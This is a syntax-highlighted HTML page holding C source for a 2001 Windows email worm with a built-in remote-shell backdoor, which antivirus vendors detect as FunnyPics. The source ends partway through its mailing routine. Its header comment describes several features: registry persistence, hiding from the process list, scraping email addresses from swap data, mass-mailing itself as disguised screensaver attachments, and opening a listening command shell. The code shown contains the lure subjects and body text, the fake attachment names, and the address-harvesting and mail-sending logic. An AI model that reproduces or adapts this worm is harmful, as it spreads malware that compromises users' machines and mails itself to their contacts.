<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.FunnyPics - BRSHWORM.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*

Bumblebee's Remote Shell [BRSH] (worm edition)
Detected by AVP as i-worm.FunnyPics

Copyright (c) 2001 Bumblebee &lt;bbbee@mailcity.com&gt;

Disclaimer:

THIS IS THE SOURCE CODE OF AN I-WORM. THE AUTHOR IS NOT RESPONSABILE
OF ANY DAMAGES THAT MAY OCCUR DUE TO ITS BUILD AND EXECUTION.

Description:

 Long time since my plage 2000. Now, the bee returns...

 Execution modes:

    execution mode   stealth mess   install   mail   backdoor
  --------------------------------------------------------------
       default     |      1            1        0       0
  -q   quiet       |      0            0        1       1
  -i   install     |      0            1        0       0
  -m   mail spawn  |      0            0        1       0
  --------------------------------------------------------------

 It installs into windows folder and registers itself in the registry
 as a service (that will run in -q mode).

 This is a very simple worm spreading trought mail with mapi32.dll.
 Well, not really simple :) It uses a complex way to get mail addr.
 It creates a empty file and makes it grown in with the file mapping
 routines. As result the file growth is filled with data of the swap
 disk. html files included, you got it? ;) This is a proof of concept
 of another serious lack of security in windows systems. Notice this
 has been tested only under win9x systems and is not as effective as
 other methods are. As far as i know this is the 1st worm that
 exploits this issue.

 It also has a cute backdoor: BRSH (win9x only).

 BRSH is a little remote shell for win9x systems. It listens a port
 (default is 8000+rnd 256) for TCP connections. When a connection is
 established it makes tunneling between the connection and a std
 shell (command.com).

 It supports end session by closing the shell ('exit') or by disconnection.
 Notice second case is less stable. After a session is closed it will
 listen to another connection.

 To sum up, you have here a little clean worm with a simple but effective
 backdoor. Have fun!

 The way of the bee

*/</span><span class="sc0">

</span><span class="sc9">#include&lt;windows.h&gt;
#include&lt;stdio.h&gt;
#include&lt;tchar.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;winsock.h&gt;
#include&lt;mapi.h&gt;
</span><span class="sc0">
</span><span class="sc1">/* comment following line to enable debug version for the shell */</span><span class="sc0">
</span><span class="sc9">#define RELEASE
</span><span class="sc0">
</span><span class="sc9">#ifndef RELEASE
#include&lt;assert.h&gt;
#else
#define assert(x)  </span><span class="sc1">/* x */</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc1">/* API form MAPI32 used by the worm */</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSENDMAIL</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MLOGON</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPLHANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MLOGOFF</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* some usefull API's */</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ICONNECT</span><span class="sc10">)(</span><span class="sc11">LPDWORD</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">reserved</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">RSP</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#define RSHM_VERSION    0
#define RSHM_STDADDR    1
#define RSHM_EXIT       2
#define RSH_COMMAND     3
#define RSH_DAEMON      4
#define RSH_REGKEY      5
#define RSH_REGNAME     6
#define RSH_MAPIDLL     7
#define RSH_WINETDLL    8
#define RSH_GETCONNST   9
#define RSH_KERNEL32    10
#define RSH_RSP         11
#define RSH_ATTACHMENT  12
#define RSH_SUBJECT     28
#define RSH_BODY        44
#define RSH_LOGON       45
#define RSH_LOGOFF      46
#define RSH_SENDMAIL    47
#define RSH_SMTP        48
#define RSH_MAILTO      49
#define RSH_BSWAP       50
</span><span class="sc0">
</span><span class="sc9">#define RSH_STDPORT     8000
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">rsh_mess</span><span class="sc10">[]=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc6">"\n[BRSH]\n\r"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"0.0.0.0"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"exit\n\r"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"command.com"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\\brsh32.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"brsh32Service"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"WININET.DLL"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"InternetGetConnectedState"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"RegisterServiceProcess"</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc6">"funnyPic.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"billBates.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"SouthParkOuttaSpace.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"x-filez.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"intelAside.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"mac0s.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"paradise.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"phantomMenaze.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"southPark.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"matrix-SP.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"starWarz.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"waaazUp.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"mrBrown.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"bzzz.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"nastyPokemon.scr"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"kennyIsAlive.scr"</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc6">"funny pics is online again!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"download screensavers for free!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Free pics and screensavers"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"do you wanna laugh out?"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"humor OnLine"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"huff OUT!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Download funny pics for free!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"pics &amp; screensavers"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Save your screen!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"hunk of fun!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"what you wanna see?"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"funnypics special offer"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Listen to Dr.Fun"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"free screensaver"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"ready? steady? laugh!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"are you ready to enjoy?"</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc6">"Funny Pics Inc. strikes back with more free stuff.\n\n"</span><span class="sc0">
</span><span class="sc6">"Visit our new website with lots of funny pics and\n"</span><span class="sc0">
</span><span class="sc6">"new screensavers like this!\n\n"</span><span class="sc0">
</span><span class="sc6">"  www.funnypics.com\n\n"</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc6">"MAPILogon"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"MAPILogoff"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"MAPISendMail"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"SMTP:"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"mailto:"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"~bswap.tmp"</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc1">/* checks for internet connection */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0">
</span><span class="sc11">iconnected</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">winetDll</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ICONNECT</span><span class="sc0"> </span><span class="sc11">GetConnState</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">msec</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc1">/* if we cannot know if it is connected... :/ */</span><span class="sc0">
  </span><span class="sc11">winetDll</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_WINETDLL</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">winetDll</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc1">/* this case is different, if wininet.dll is installed... assume
     we have net available */</span><span class="sc0">
  </span><span class="sc11">GetConnState</span><span class="sc10">=(</span><span class="sc11">ICONNECT</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">winetDll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_GETCONNST</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetConnState</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">winetDll</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc1">/* wait while is offline, use a progressive wait loop */</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">GetConnState</span><span class="sc10">)(&amp;</span><span class="sc11">result</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)!=</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc11">msec</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">msec</span><span class="sc10">+=</span><span class="sc4">1000</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">winetDll</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* look for mailto addresses in a buffer. it plazes the result into
   the 'found' char array */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0">
</span><span class="sc11">ScanMailto</span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">found</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">test</span><span class="sc10">,</span><span class="sc11">valid</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmp</span><span class="sc10">=*</span><span class="sc11">file</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;*</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">test</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">_strnicmp</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_MAILTO</span><span class="sc10">],</span><span class="sc11">tmp</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc4">6</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'&gt;'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;*</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">128</span><span class="sc0">
                        </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'\''</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'"'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">found</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                                </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">found</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">+=</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">*</span><span class="sc11">size</span><span class="sc10">-=</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* mail stuff */</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0">
</span><span class="sc11">SpawnMail</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fmobj</span><span class="sc10">,</span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lpobj</span><span class="sc10">,*</span><span class="sc11">file</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mailto</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
 </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">MAPIdll</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">MLOGON</span><span class="sc0"> </span><span class="sc11">MLogon</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">MLOGOFF</span><span class="sc0"> </span><span class="sc11">MLogoff</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">MSENDMAIL</span><span class="sc0"> </span><span class="sc11">MSendMail</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc11">attachment</span><span class="sc10">={</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,(</span><span class="sc11">ULONG</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc0">
 </span><span class="sc10">};</span><span class="sc0">
 </span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">destination</span><span class="sc10">={</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_TO</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
 </span><span class="sc10">};</span><span class="sc0">
 </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">mbody</span><span class="sc10">={</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_RECEIPT_REQUESTED</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc0">
 </span><span class="sc10">};</span><span class="sc0">

 </span><span class="sc11">attachment</span><span class="sc10">.</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">filename</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">attachment</span><span class="sc10">.</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_ATTACHMENT</span><span class="sc10">+(</span><span class="sc11">GetTickCount</span><span class="sc10">()&amp;</span><span class="sc4">0x0f</span><span class="sc10">)];</span><span class="sc0">
 </span><span class="sc11">destination</span><span class="sc10">.</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">mbody</span><span class="sc10">.</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_SUBJECT</span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">GetTickCount</span><span class="sc10">()&amp;</span><span class="sc4">0xf0</span><span class="sc10">)&gt;&gt;</span><span class="sc4">4</span><span class="sc10">)];</span><span class="sc0">
 </span><span class="sc11">mbody</span><span class="sc10">.</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_BODY</span><span class="sc10">];</span><span class="sc0">
 </span><span class="sc11">mbody</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">=&amp;</span><span class="sc11">destination</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">mbody</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">=&amp;</span><span class="sc11">attachment</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc1">/* Lowest priority */</span><span class="sc0">
 </span><span class="sc11">SetThreadPriority</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">THREAD_PRIORITY_LOWEST</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc1">/* if is not -m mode wait 5 minutes */</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(*((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">param</span><span class="sc10">)==</span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">*</span><span class="sc4">60</span><span class="sc10">*</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc11">MAPIdll</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_MAPIDLL</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MAPIdll</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">


 </span><span class="sc11">MLogon</span><span class="sc10">=(</span><span class="sc11">MLOGON</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_LOGON</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MLogon</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc11">MLogoff</span><span class="sc10">=(</span><span class="sc11">MLOGOFF</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_LOGOFF</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MLogoff</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc11">MSendMail</span><span class="sc10">=(</span><span class="sc11">MSENDMAIL</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_SENDMAIL</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MSendMail</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">MLogon</span><span class="sc10">)(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_USE_DEFAULT</span><span class="sc10">,</span><span class="sc0">
